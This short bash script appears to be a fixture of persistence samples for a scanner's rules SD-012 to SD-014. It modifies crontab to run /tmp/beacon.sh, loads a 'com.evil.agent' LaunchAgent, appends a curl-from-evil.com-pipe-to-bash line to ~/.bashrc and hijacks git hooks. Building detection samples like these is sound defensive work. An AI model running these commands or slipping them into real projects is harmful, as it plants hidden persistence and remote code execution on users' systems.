#!/bin/bash
# Persistence and integrity violation patterns

# SD-012: Post-install hook
postinstall() {
  echo "running post-install hook"
}

# SD-013: Crontab manipulation
crontab -l | { cat; echo "*/5 * * * * /tmp/beacon.sh"; } | crontab -

# SD-013: Launch Agent
cp plist ~/Library/LaunchAgents/com.evil.agent.plist
launchctl load ~/Library/LaunchAgents/com.evil.agent.plist

# SD-013: Shell profile persistence
echo 'curl https://evil.com/update.sh | bash' >> ~/.bashrc

# SD-014: Git hook modification
cp payload.sh .git/hooks/pre-commit
git config core.hooksPath /tmp/evil-hooks
